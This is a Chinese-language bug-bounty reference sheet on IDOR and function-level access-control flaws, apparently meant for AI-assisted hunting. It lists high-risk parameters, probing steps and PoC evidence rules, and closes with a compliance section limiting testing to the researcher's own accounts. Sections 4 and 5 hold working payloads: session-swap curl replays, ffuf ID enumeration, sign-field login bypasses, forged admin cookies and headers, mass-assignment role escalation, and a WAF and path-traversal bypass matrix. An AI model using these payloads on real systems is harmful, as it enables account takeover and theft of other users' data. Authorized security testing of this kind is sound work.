# IDOR / 越权（对象级 + 功能级访问控制失效）

> 应用把「内部对象的引用」直接暴露给客户端，却不在服务端校验「当前用户是否有权碰这个对象/这个操作」。IDOR = 改 ID 读写**他人**资源（水平越权）；「任意 X」= 普通用户直接调管理员/审核/财务接口（垂直/功能级越权）。两类合起来是 SRC 出货率最高的漏洞族之一：IDOR 高危占比 62.3%，「任意账号」子类高危占比高达 86.4%（数据来源：本地 src-hunter WooYun 案例统计，非官方数据），几乎等价 RCE。

**取材来源**：[MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（529 案例）、[elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（26 份公开报告）、[SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)；权威公开源 PortSwigger / OWASP API1:2023 (BOLA)。

---

## 1. 触发信号

- URL / 请求体 / Cookie / Header 里出现对象引用：数字 ID、UUID、slug、`id=`、`user_id=`、`order_id=`。
- 列表/详情/导出接口直接返回「别人」的数据（如 `pageSize=99999` 翻全量订单）。
- 接口路径含 `admin/manage/system/backend`，但普通用户 token 能调通。
- 响应字段含 `status/state/auditState`（有审核动作）、或 `role`/`is_admin` 字段被回显。
- 请求里显式传了 `role`/`roleid`/`is_admin`/`permissions`/`level` 这类权限字段（mass assignment 嫌疑）。

**真实案例指纹** `[本地 src-hunter]`：

- 任意账号：鱼泡泡 APP（sign 字段置空绕过）/ TCL 统一认证（SSO 回调 `userId=` 可控）/ 福建网龙 wooyun-2015-0157092（`?userAccount=admin` 写 Cookie）
- 任意操作：中国铁通计费系统（普通账号生成充值卡）/ M1905（创建订单 + 自审）/ 微小宝（接口未校验 actor，操控 19 万微信号）
- 任意查看：北京现代某平台（顺序文件 ID 无所有权检查，遍历几百万证件）
- 任意修改：龙珠网直播平台（profile 写接口不校验 owner）

## 2. 高频入口点

**高危参数名** `[Claude-Red]`：

```
id user_id account_id file doc document record item order number profile
edit view filename object num key userid uuid group role uid org_id
tenant_id business_id
```

**URL 模式** `[Claude-BugHunter]`：

```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
```

**子类别 × 高危占比**（529 案例统计 `[本地 src-hunter]`）：

| 子类 | 案例数 | 高危占比 | 探测主战场 |
|---|---|---|---|
| 任意账号 / 任意登录 | 220 | 86.4% | 登录、SSO、第三方登录回调 |
| 任意用户注册 | 24 | 75.0% | 注册接口、SSO 注册回调 |
| 任意操作 | 40 | 72.5% | 审核、上下架、退款审批、发卡 |
| 任意修改 | 159 | 63.5% | profile/config/content 写接口 |
| 任意查看 | 45 | 55.6% | 报表、导出、admin search |
| 任意删除 | 41 | 51.2% | DELETE / `?action=del` |

## 3. 探测顺序（双账号 + 三角色）

1. **建双账号**：User A（资源所有者）+ User B（攻击者），同权限级；能拿到的话再加账号 C（商家/审核员）。全程只用自己的测试号互测 `[本地 src-hunter + Claude-BugHunter]`。
2. **抓基线**：以 A 登录浏览所有功能，用 Burp 记录全部含 `id=`/`_id=`/`uuid=`/`/v1/{noun}/{id}` 的请求；确认 A 自己的合法 ID 集合 `[Claude-BugHunter]`。
3. **水平越权（IDOR）**：换成 B 的 session，重放 A 的对象 ID，对**每个动词** GET/POST/PUT/PATCH/DELETE 都测。命中 = 200 返回 A 的数据或改了 A 的 state `[Claude-BugHunter]`。
4. **垂直越权（任意 X）**：用 B 调「只有 C/admin 才能调」的接口（`/admin/*`、审批/发卡/退款），或完全不带 token 调。命中 = 200 + 生效 `[本地 src-hunter]`。
5. **mass assignment 提权**：在注册/资料更新 body 里加 `role`/`roleid`/`is_admin` 字段，注册后立即 `/api/me` 看 role 是否回显 `[本地 src-hunter]`。
6. **写/删操作**：B 能否 DELETE A 的资源？B 能否把自己加进 A 的 team？读 + 写 + 删全测 `[Claude-BugHunter]`。
7. **降级**：直接替换返回 403 → 试 HTTP 方法切换、HPP、旧版本 API `/v1/`、参数名变体、嵌套 JSON、base64 解码后改 ID。

## 4. Payload 区（每条标注出处）

### 4.1 基础 IDOR 替换 `[Claude-BugHunter]`

```bash
# A 的资源 ID（以 A 登录时抓到）
curl -s -H "Cookie: session=USER_A_SESSION" https://target.com/api/v1/invoices/12345
# 换 B 的 session 重放同一个 ID
curl -s -H "Cookie: session=USER_B_SESSION" https://target.com/api/v1/invoices/12345
# 200 + A 的数据 = IDOR
```

```bash
# 顺序 ID 枚举
ffuf -u "https://target.com/api/v1/orders/FUZZ" -w ids.txt \
  -H "Authorization: Bearer USER_B_TOKEN" -mc 200 -o idor_results.json
```

### 4.2 任意账号 / 任意登录 `[本地 src-hunter]`

```http
POST /api/login
{"phone":"13888888888","sign":"abc..."}

# 删 sign / 置空 / 全 0 替换
{"phone":"victim_phone"}                    → 200 接管
{"phone":"victim_phone","sign":""}          → 200 接管
{"phone":"victim_phone","sign":"00000000"}  → 200 接管（哈希校验关闭）
```

```http
# 一键登录：拿自己的 token 改 phone
POST /api/loginByToken?token=token_self&phone=victim
# 服务端只看 token 有效性，不校验 token 是否绑定 phone → 登入受害者
```

```http
# Cookie / Header 直接信任
Cookie: userId=1; userAccount=admin; isAdmin=1; role=admin
X-User-Id: 1
X-Original-User: admin
```

### 4.3 任意用户注册 / mass assignment 提权 `[本地 src-hunter]`

```bash
POST /api/register
{"username":"hunter1","password":"x","role":"admin"}
{"username":"hunter2","password":"x","is_admin":true}
{"username":"hunter3","password":"x","admin":1}
{"username":"hunter4","password":"x","level":9,"role_id":1}
{"username":"hunter5","password":"x","permissions":["*"]}

# 嵌套 / 大小写 / 别名 try-list
"user":{"role":"admin"}        # 嵌套
"User":{"Role":"admin"}        # PascalCase
"profile":{"isAdmin":true}     # camelCase nested
"meta":{"role_id":99}          # 元数据字段
"_role":"admin"                # 下划线前缀（部分框架 strip）
"role[]=admin"                 # 表单数组
```

### 4.4 Bypass 矩阵 `[Claude-Red + Claude-BugHunter]`

| 防护 | 绕过 |
|---|---|
| UUID 不可枚举 | 从 JS/响应/通知邮件/webhook/GraphQL 里 harvest UUID 再重放 |
| 哈希/间接引用 | `echo "dXNlcl8xMjM0NQ==" | base64 -d` → `user_12345`，改后重编码 |
| 数字 ID 顺序 | ±1 / ±100 枚举，用 ffuf/Intruder |
| 只挡 GET | 换 POST/PUT/PATCH/DELETE 同路径 |
| 只挡 `/v3/` | 试 `/v1/` `/v2/` 旧版本（鉴权常是版本特定的）|
| 参数过滤/WAF | HPP `?id=own_id&id=victim_id`；嵌套 JSON `{"data":{"id":"VICTIM"}}`；参数名变体 `user_id`/`userId`/`uid`/`account` |
| 路由大小写/规范化 | `GET /admin/profile` → `/ADMIN/profile`；路径穿越 `POST /users/delete/MY_ID/../VICTIM_ID` |
| 数组包裹 | `{"id":19}` → `{"id":[19]}`；`{"id":111}` → `{"id":{"id":111}}` |

## 5. 工具用法

```bash
# 双账号对比（Authorize 插件自动化；或手工 swap cookie）
# Burp Intruder 顺序枚举（数字 payload 12000-13000，按长度/200 过滤）
# Arjun 发现隐藏参数（常是 IDOR 入口）
arjun -u https://target.com/api/messages -m GET
# ffuf 顺序 ID 枚举
ffuf -u "https://target.com/api/v1/orders/FUZZ" -w ids.txt -H "Authorization: Bearer B_TOKEN" -mc 200
# 方法遍历
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  curl -s -X $method -H "Authorization: Bearer B_TOKEN" https://target.com/api/v1/users/A_ID/profile
done
```

> 生成顺序 ID 词表：`known_id=48291; for i in $(seq $((known_id-500)) $((known_id+500))); do echo $i; done > ids.txt` `[Claude-BugHunter]`。

## 6. 证据要求

**「已确认」必须满足**（`[Claude-BugHunter]` Gate 0）：① 用两个全新账号可复现；② 精确记录「受害者 ID + 攻击者 token + 完整 HTTP 包」；③ 200 回显受害者数据（或确认状态变更）；④ 不依赖预置状态/时序，10 分钟内能从零复现。200 但 body 为空数组/脱敏/「access denied」的 IDOR 是 H1 头号 N/A 来源，不报 `[Claude-BugHunter]`。

**PoC 模板（任意操作）** `[本地 src-hunter]`：

```markdown
## 复现
Step1: POST /api/withdraw/apply  (A_token)  {"amount":1.00} → {"applyId":"PA...","status":"pending"}
Step2: POST /admin/withdraw/approve (A_token 普通用户) {"applyId":"PA...","decision":"approve"} → {"status":"approved"}
Step3: 余额到账截图；用账号 B 重复，证明非个例
## 测试边界：每笔 1 元，共 2 元，可退还厂方
```

**CVSS 参考** `[本地 src-hunter]`：任意账号未授权接管 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8`；认证后任意操作 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8`。

## 7. 合规边界 / 不要做的事

- **禁**：用任意账号登录**真实**用户账号看数据。永远用研究员注册的两个测试号互测 `[本地 src-hunter]`。
- **禁**：任意删除真实数据，即使接口允许。用双账号互删证明能力即可；只能截 JS/Burp 看到接口暴露 + 不带 cookie 看 401/403 是否拦截，绝不实际触发 `[本地 src-hunter]`。
- **禁**：任意操作发起真实退款/转账。证明到「接口返回 success」即停，立即联系厂方/SRC 核实回滚 `[本地 src-hunter]`。
- **禁**：任意注册用 `admin@victim.com` 高权限邮箱——用自己邮箱后缀（`hunter+1@yourdomain`）`[本地 src-hunter]`。
- **禁**：任意修改全站公告/邮件模板。改一次影响真实用户，证明「接口调通 + 200」即停 `[本地 src-hunter]`。
- 确认提权后只用 `/api/me` 看 role 字段，不进入 admin 后台实际操作 `[本地 src-hunter]`。
- 枚举降速：受速率限制的目标 1 req/5s，不要暴力扫全 ID 段 `[Claude-BugHunter]`。
